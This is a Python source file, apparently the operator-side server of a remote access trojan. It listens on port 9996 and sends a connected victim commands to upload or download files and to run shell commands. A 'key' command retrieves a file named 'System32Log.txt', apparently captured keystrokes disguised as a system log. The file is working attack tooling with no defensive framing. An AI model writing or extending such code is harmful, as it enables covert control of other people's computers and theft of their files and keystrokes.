import socket
import threading
import time
import base64
TAMANHO_BUFFER=200
PORTA=9996
BIND = "0.0.0.0"
#OPCODES:

OP_HELLO=0 #
OP_ENVIAR_ARQUIVO=1
OP_FIM_ARQUIVO=2
OP_BAIXAR_ARQUIVO=3
OP_RODAR_CMD=4
class pacote:
    def __init__(self):
        self.mensagem=""
        self.comprimento=0
        self.opCode=OP_HELLO
    def config(self,msg,opcode,comprimento=0):
        self.mensagem=msg
        self.opCode=opcode
        if comprimento==0:
            self.comprimento=len(msg)
        else:
            self.comprimento=comprimento
        

        
class server:
    def __init__(self):
        self.mensagem=pacote()
        self.soquete=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.soquete.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.soquete.bind((BIND,PORTA))
        self.soquete.listen(1)
        #threading.Thread(target=self.conecaoLoop,args=()).start()
        #threading.Thread(target=self.ler,args=()).start()
        self.conecaoLoop()

    def conecaoLoop(self):
    
        while 1:
            #try:
            self.client,addr = self.soquete.accept()
            print("conexao com ",addr)
            string="Bem vindo ao servidor"
            self.mensagem.config(string,OP_HELLO)
            self.enviarMensagem()
            self.receberMensagem()
            print (self.mensagem.mensagem[:
                    self.mensagem.comprimento],
                    self.mensagem.opCode)
            while 1:
                        
                self.ler()
                self.enviarMensagem()
                if self.mensagem.opCode==OP_ENVIAR_ARQUIVO:
                    self.receberArquivo(self.mensagem.mensagem)
                elif self.mensagem.opCode==OP_BAIXAR_ARQUIVO:
                    self.enviarArquivo(self.mensagem.mensagem)
                elif self.mensagem.opCode==OP_RODAR_CMD:
                    self.receberArquivo(self.mensagem.mensagem,1)
            #except Exception as erro:
            #    print("Alguem desconectou, reiniciando", erro)
        
                
    def enviarMensagem(self):
        #resposta = str.encode(msg+"\0")
        #self.client.send(resposta)
        if type(self.mensagem.mensagem) is str:
            self.mensagem.mensagem=self.mensagem.mensagem.encode("utf-8")
            
        pacote=bytearray(0)
        pacote+=bytearray(self.mensagem.comprimento.to_bytes(4,"little"))
        pacote+=bytearray(self.mensagem.opCode.to_bytes(1,"little"))
        
        pacote+=bytearray(self.mensagem.mensagem)
        #print("Enviando..:",pacote)
        self.client.send(pacote)
        #print("Enviei!")
        
    def receberMensagem(self):
        data = self.client.recv(TAMANHO_BUFFER)
        self.mensagem.comprimento=int.from_bytes(data[:4],"little")
        self.mensagem.opCode=data[4]
        self.mensagem.mensagem=data[5:]
        
        
    def ler(self):
        #try:
        cmd=""
        while len(cmd)<3:
            cmd=input("insira comando:")
        lista=converter(cmd)            
        self.mensagem.config(lista[1],lista[0])
        #except Exception as erro:
        #    print("Erro ao rodar leitura",erro)
        #    self.ler()
            
        
    def enviarArquivo(self,nome):
        try:
            arquivo=open(nome,"rb")
            while 1:
                lido=arquivo.read(TAMANHO_BUFFER-5)
                self.mensagem.config(lido,
                                     OP_BAIXAR_ARQUIVO,
                                     len(lido))
                if len(lido)==0:
                    self.mensagem.opCode=OP_FIM_ARQUIVO
                    break
                #print(lido)
                
                self.enviarMensagem()
            print("\nFim\n",self.mensagem.opCode)
            arquivo.close()
            self.enviarMensagem()

        
        except Exception as erro:
            print("erro ao abrir arquivo para envio",erro.message)
            self.mensagem.opCode=OP_FIM_ARQUIVO
            self.enviarMensagem()
        
            
    def receberArquivo(self,nome,flag=0):
        if flag==0:
            arquivo=open(nome,"wb")
        while 1:
            
            self.receberMensagem()
            if self.mensagem.opCode==OP_FIM_ARQUIVO:
                print(self.mensagem.mensagem[:self.mensagem.comprimento])
                break

            if flag==0:
                arquivo.write(self.mensagem.mensagem[:self.mensagem.comprimento])
            else:
                print(self.mensagem.mensagem[:self.mensagem.comprimento].decode("utf-8",errors="ignore"),end="")
        if flag==0:
            arquivo.close()
def converter(cmd):
    lista=cmd.split(" ")
    if lista[0]=="key":
        lista[0]=OP_ENVIAR_ARQUIVO
        lista.append("System32Log.txt")
        print("lista:",lista)
        return lista
    
    elif len(lista)<2:
        raise Exception
    
    elif lista[0]=="get":
        lista[0]=OP_ENVIAR_ARQUIVO
    elif lista[0]=="up":
        lista[0]=OP_BAIXAR_ARQUIVO
    elif lista[0]=="do":
        lista[0]=OP_RODAR_CMD
    
    else:
        raise Exception
    lista[1]=cmd[cmd.find(" ")+1:]
    print("lista:",lista)
    return lista
        
meuServer = server()

